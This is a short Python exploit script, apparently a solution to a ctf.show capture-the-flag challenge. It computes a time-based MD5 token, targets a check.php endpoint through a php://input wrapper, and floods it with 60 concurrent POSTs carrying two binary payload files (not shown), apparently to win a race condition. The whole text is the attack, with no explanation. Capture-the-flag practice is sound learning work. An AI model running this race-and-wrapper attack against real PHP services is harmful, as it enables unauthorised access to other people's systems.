import requests
import time
import hashlib
import threading

def post(data):
	try:
		r=requests.post(url,data=data)
		if "ctfshow" in r.text:
			print(r.text)
	except Exception as e:
		pass

mi=str(time.localtime().tm_min)
m=hashlib.md5(mi.encode()).hexdigest()
url='http://5b0724f4-a095-4b9c-aff0-246e10bede10.challenge.ctf.show:8080/check.php?token={}&php://input'.format(m)
with open('key.dat','rb') as f:
    data1=f.read()
with open('2.dat','rb') as f:
    data2=f.read()
for i in range(30):
	threading.Thread(target=post,args=(data1,)).start()
for i in range(30):
	threading.Thread(target=post,args=(data2,)).start()
